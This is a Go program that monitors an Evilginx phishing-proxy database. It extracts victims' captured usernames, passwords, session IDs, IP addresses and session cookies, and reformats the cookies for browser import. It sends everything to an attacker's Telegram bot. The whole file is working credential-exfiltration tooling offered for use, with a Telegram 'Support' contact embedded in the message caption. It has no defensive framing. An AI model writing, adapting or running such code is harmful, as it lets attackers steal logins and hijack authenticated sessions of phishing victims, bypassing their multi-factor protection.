package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"time"

	"github.com/fsnotify/fsnotify"
)

var (
	fileToWatch   = "/root/.evilginx/data.db"
	telegramToken = ""
	telegramChat  = ""
)

// Track messages and last token per username
var userMessages = make(map[string]int)
var lastUserTokens = make(map[string]string)

// ----------------------
// Cookie structs
// ----------------------
type CookieInput struct {
	Name     string `json:"Name"`
	Value    string `json:"Value"`
	Path     string `json:"Path"`
	HttpOnly bool   `json:"HttpOnly"`
}

type CookieOutput struct {
	Path     string `json:"path"`
	Domain   string `json:"domain"`
	Value    string `json:"value"`
	Name     string `json:"name"`
	HttpOnly bool   `json:"httpOnly"`
	HostOnly bool   `json:"hostOnly"`
	Secure   bool   `json:"secure"`
	Session  bool   `json:"session"`
}

func main() {
	if _, err := os.Stat(fileToWatch); os.IsNotExist(err) {
		fmt.Printf("❌ File does not exist: %s\n", fileToWatch)
		return
	}

	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		fmt.Println("⚠️ Watcher error:", err)
		return
	}
	defer watcher.Close()

	if err := watcher.Add(fileToWatch); err != nil {
		fmt.Println("⚠️ Failed to watch file:", err)
		return
	}

	fmt.Println("✅ Monitoring:", fileToWatch)
	fmt.Println("🛑 Press CTRL + C to stop")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt)

	go func() {
		for {
			select {
			case event := <-watcher.Events:
				if event.Op&fsnotify.Write == fsnotify.Write {
					time.Sleep(1 * time.Second)
					username, password, sessionID, userAgent, raw, remoteAddr := extractLatestData(fileToWatch)
					if username == "" || raw == "" {
						continue
					}

					converted := convertTokens(raw)
					if converted == "" {
						continue
					}

					// Only update if token changed
					if lastUserTokens[username] == raw {
						continue
					}

					// Prepare token file with username as filename
					tokenFile := fmt.Sprintf("%s_cookie.json", username)
					os.WriteFile(tokenFile, []byte("\n"+converted+"\n"), 0644)

					msg := fmt.Sprintf(
						"Support | https://t.me/therealyrn\n\n👤 Username: %s\n🔑 Password: %s\n🆔 Session ID: %s\n🖥️ User-Agent: %s\n🌐 IP: %s\n⏰ Date & Time: %s\n\n(Updated)",
						username, password, sessionID, userAgent, remoteAddr,
						time.Now().Format("2006-01-02 15:04:05"),
					)

					if _, exists := userMessages[username]; !exists {
						messageID := sendTelegramWithFile(msg, tokenFile)
						if messageID != 0 {
							userMessages[username] = messageID
							lastUserTokens[username] = raw
							fmt.Println("NEW USER → Sent:", username)
						}
					} else {
						edited := editTelegramFile(userMessages[username], msg, tokenFile)
						if !edited {
							messageID := sendTelegramWithFile(msg, tokenFile)
							if messageID != 0 {
								userMessages[username] = messageID
								lastUserTokens[username] = raw
								fmt.Println("MESSAGE MISSING → Sent new:", username)
							}
						} else {
							lastUserTokens[username] = raw
							fmt.Println("UPDATE → Edited:", username)
						}
					}

					os.Remove(tokenFile)
				}
			case err := <-watcher.Errors:
				fmt.Println("⚠️ Watcher error:", err)
			}
		}
	}()

	<-stop
	fmt.Println("\n✅ Monitor stopped.")
}

// ----------------------
// Extract username/password/sessionID/userAgent/token/IP
// ----------------------
func extractLatestData(fileName string) (string, string, string, string, string, string) {
	file, err := os.Open(fileName)
	if err != nil {
		return "", "", "", "", "", ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var username, password, sessionID, userAgent, token, remoteAddr string

	userRx := regexp.MustCompile(`"username":"([^"]*)"`)
	passRx := regexp.MustCompile(`"password":"([^"]*)"`)
	sessionRx := regexp.MustCompile(`"session_id":"([^"]*)"`)
	agentRx := regexp.MustCompile(`"useragent":"([^"]*)"`)
	tokenRx := regexp.MustCompile(`"tokens":\s*({.*})`)
	ipRx := regexp.MustCompile(`"remote_addr":"([^"]*)"`)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if m := userRx.FindStringSubmatch(line); len(m) == 2 {
			username = m[1]
		}
		if m := passRx.FindStringSubmatch(line); len(m) == 2 {
			password = m[1]
		}
		if m := sessionRx.FindStringSubmatch(line); len(m) == 2 {
			sessionID = m[1]
		}
		if m := agentRx.FindStringSubmatch(line); len(m) == 2 {
			userAgent = m[1]
		}
		if m := tokenRx.FindStringSubmatch(line); len(m) == 2 {
			token = m[1]
		}
		if m := ipRx.FindStringSubmatch(line); len(m) == 2 {
			remoteAddr = m[1]
		}
	}

	return username, password, sessionID, userAgent, token, remoteAddr
}

// ----------------------
// TOKEN CONVERTER
// ----------------------
func convertTokens(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}

	if raw[0] != '{' {
		raw = "{" + raw + "}"
	}

	var input map[string]map[string]CookieInput
	decoder := json.NewDecoder(strings.NewReader(raw))
	decoder.UseNumber()
	if err := decoder.Decode(&input); err != nil {
		fmt.Println("⚠️ JSON parse error:", err)
		return ""
	}

	var output []CookieOutput
	for domain, cookies := range input {
		for _, c := range cookies {
			hostOnly := false
			secure := false
			if len(domain) > 0 && domain[0] != '.' {
				hostOnly = true
				secure = true
			}
			out := CookieOutput{
				Path:     c.Path,
				Domain:   domain,
				Value:    c.Value,
				Name:     c.Name,
				HttpOnly: c.HttpOnly,
				HostOnly: hostOnly,
				Secure:   secure,
				Session:  false,
			}
			output = append(output, out)
		}
	}

	j, _ := json.MarshalIndent(output, "", "  ")
	return string(j)
}

// ----------------------
// Telegram send document
// ----------------------
func sendTelegramWithFile(message, filePath string) int {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramToken)

	file, _ := os.Open(filePath)
	defer file.Close()

	var b bytes.Buffer
	writer := multipart.NewWriter(&b)

	writer.WriteField("chat_id", telegramChat)
	writer.WriteField("caption", message)

	fw, _ := writer.CreateFormFile("document", filePath)
	io.Copy(fw, file)
	writer.Close()

	req, _ := http.NewRequest("POST", url, &b)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("⚠️ Telegram send error:", err)
		return 0
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	data, _ := io.ReadAll(resp.Body)
	json.Unmarshal(data, &result)
	if ok, exists := result["ok"].(bool); exists && ok {
		if msg, ok := result["result"].(map[string]interface{}); ok {
			if id, ok := msg["message_id"].(float64); ok {
				return int(id)
			}
		}
	}
	return 0
}

// ----------------------
// Telegram edit message + file
// ----------------------
func editTelegramFile(messageID int, caption, filePath string) bool {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageMedia", telegramToken)

	file, _ := os.Open(filePath)
	defer file.Close()

	var b bytes.Buffer
	writer := multipart.NewWriter(&b)

	media := fmt.Sprintf(`{"type":"document","media":"attach://document","caption":"%s"}`, caption)
	writer.WriteField("chat_id", telegramChat)
	writer.WriteField("message_id", fmt.Sprintf("%d", messageID))
	writer.WriteField("media", media)

	fw, _ := writer.CreateFormFile("document", filePath)
	io.Copy(fw, file)
	writer.Close()

	req, _ := http.NewRequest("POST", url, &b)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("⚠️ Telegram edit error:", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Println("✅ Message edited successfully with updated file.")
		return true
	} else {
		data, _ := io.ReadAll(resp.Body)
		fmt.Println("⚠️ Failed to edit message, sending new:", string(data))
		return false
	}
}